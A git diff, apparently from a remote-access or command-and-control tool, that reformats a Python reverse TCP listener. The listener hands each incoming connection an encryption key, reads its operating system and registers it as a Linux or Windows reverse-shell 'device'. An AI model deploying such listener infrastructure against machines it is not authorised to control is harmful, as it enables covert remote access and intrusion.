@@ -3,8 +3,11 @@ from Utils import *
 from Handlers.socket.reverse.tcp.linux import Linux
 from Handlers.socket.reverse.tcp.windows import Windows
 from Listeners.base import Base_Listener
+
+
 class Listener(Base_Listener):
     """The Reverse Tcp Listener Class"""
+
     def __init__(self, server, config, id):
         super().__init__(server, config, id)
         #self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
@@ -42,22 +45,25 @@ class Listener(Base_Listener):
             else:
                 self.key = Fernet.generate_key()
                 self.fernet = Fernet(self.key)
-                log(f"New Connection established from {addr[0]}", alert="success")
+                log(
+                    f"New Connection established from {addr[0]}", alert="success")
                 connection.send(self.key)
                 try:
-                    operating_system = self.decrypt(connection.recv(1024)).lower()
+                    operating_system = self.decrypt(
+                        connection.recv(1024)).lower()
                 except:
-                    log(f"Connection to {addr[0]} has been lost.", alert="critical")
+                    log(f"Connection to {addr[0]} has been lost.",
+                        alert="critical")
                     connection.close()
                     continue
                 if operating_system == "windows":
                     self.server.active_devices_count += 1
                     self.add_device(
-                        Windows(connection, addr[0], self.key, self.server.active_devices_count)) # Create a Windows Object to store the connection
+                        Windows(connection, addr[0], self.key, self.server.active_devices_count))  # Create a Windows Object to store the connection
                 elif operating_system == "linux":
                     self.server.active_devices_count += 1
                     self.add_device(
-                        Linux(connection, addr[0], self.key, self.server.active_devices_count)) # Create a Linux Object to store the connection
+                        Linux(connection, addr[0], self.key, self.server.active_devices_count))  # Create a Linux Object to store the connection
                 else:
                     log(f"Unknown Operating System: {operating_system}",
                         alert="error")
@@ -65,15 +71,19 @@ class Listener(Base_Listener):
                     continue
 
     def start(self):
+
         ADDR = (self.address, self.port)
         try:
             self.listener.bind(ADDR)
         except:
             raise Exception("Port is already in use.")
         self.listener.listen()
+
         # Start the Listener and Refresher
-        self.listener_thread = threading.Thread(target=self.listen, name="Listener " + str(self.id))
+        self.listener_thread = threading.Thread(
+            target=self.listen, name="Listener " + str(self.id))
         self.listener_thread.start()
+
         self.refresher_thread = threading.Thread(
             target=self.refresh_connections, name="Refresher")
         self.refresher_thread.start()
